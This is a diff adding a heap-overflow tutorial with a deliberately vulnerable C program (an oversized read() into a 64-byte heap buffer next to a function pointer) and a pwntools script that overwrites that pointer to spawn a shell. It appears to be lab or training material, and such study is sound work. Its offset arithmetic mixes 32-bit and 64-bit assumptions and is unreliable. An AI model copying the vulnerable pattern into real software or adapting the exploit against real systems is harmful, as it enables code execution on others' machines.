@@ -1,1 +1,119 @@
+Unlike stack overflows, which overwrite sequential function return pointers, a heap overflow targets dynamically allocated memory managed by malloc() [1].
+When you overflow a buffer allocated on the heap, you spill into the metadata structures or data fields of adjacent heap chunks [1]. Modern heap exploitation is highly dependent on the version of the C library (glibc), but the fundamental concepts remain standard.
+
+1. The Vulnerable Heap C Program (heap_vuln.c)
+
+In this scenario, we allocate two objects on the heap sequentially using malloc(). The first object contains a data buffer, and the second object contains a critical function pointer.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Opening shell...\n");
+    system("/bin/sh");
+}
+
+void standard_callback() {
+    printf("[*] Executing safe standard callback function.\n");
+}
+
+struct user_object {
+    char username[64];
+};
+
+struct secure_callback {
+    void (*callback_ptr)();
+};
+
+int main() {
+    setbuf(stdout, NULL);
+
+    // 1. Allocate chunks sequentially on the heap
+    struct user_object *user = malloc(sizeof(struct user_object));
+    struct secure_callback *secure = malloc(sizeof(struct secure_callback));
+
+    // Initialize the function pointer to a safe function
+    secure->callback_ptr = standard_callback;
+
+    printf("User chunk address: %p\n", (void*)user);
+    printf("Secure chunk address: %p\n", (void*)secure);
+
+    // VULNERABILITY: read() accepts up to 256 bytes into a 64-byte heap buffer
+    printf("Enter username: ");
+    read(0, user->username, 256);
+
+    // 2. Trigger the callback function pointer
+    secure->callback_ptr();
+
+    return 0;
+}
+Use code with caution.
+
+2. Visualizing the Heap Layout & Chunk Metadata
+
+When malloc() is called, it allocates chunks aligned to 8 or 16 bytes. Each chunk contains a hidden metadata header right before the data area that manages the size and status flags.
+When you overflow user->username, you overwrite the hidden metadata header of the secure chunk before reaching its actual variables:
+text
+       Lower Memory Address (Start of Heap)
+       +------------------------------------------+
+
+       | user chunk data: username[64]            | <-- Overflow starts here
+       +------------------------------------------+
+
+       | PREV_SIZE / SIZE metadata for next chunk | <-- Overwritten (Must handle carefully)
+       +------------------------------------------+
+
+       | secure chunk data: callback_ptr (4/8B)   | <-- TARGET: Overwrite this pointer
+       +------------------------------------------+
+       Higher Memory Address
+Use code with caution.
+Because No-PIE is active in this basic scenario, the address of win() is static, but the heap layout requires calculation to reach the function pointer.
+
+3. Step-by-Step Exploitation Plan
+
+
+Step 1: Calculate the Distance
+
+While the user buffer is 64 bytes, malloc includes chunk metadata (8 bytes on 32-bit systems, 16 bytes on 64-bit systems) to track the size of the next chunk.
+• Distance = 64 bytes (buffer) + 8 bytes (metadata header of next chunk) = 72 bytes.
+
+Step 2: Grab the Static Target Address
+
+Using a tool like GDB or objdump, find the static address of the win() function. Let's assume it is 0x080491b6.
+
+Step 3: Craft the Payload
+
+[72 bytes of padding (A)] + [4 bytes of win() address]
+
+4. The Python Heap Exploit Script (heap_exploit.py)
+
+Using pwntools, we can automate passing the exact byte structure to overwrite the function pointer smoothly.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Start the vulnerable heap binary
+io = process('./heap_vuln')
+
+# Static address of win() found via static analysis
+win_address = p32(0x080491b6)
+
+# Offset calculation:
+# 64 bytes to fill the first chunk's data field
+# + 8 bytes to safely overwrite the next chunk's size/flags metadata
+offset = 72
+
+# Construct the payload to overwrite the adjacent object's function pointer
+payload = b"A" * offset + win_address
+
+# Wait for the prompt and send the payload
+io.recvuntil(b"Enter username: ")
+log.info("Sending heap overflow payload...")
+io.sendline(payload)
+
+# Interact with the spawned shell
+io.interactive()
+Use code with caution.
 
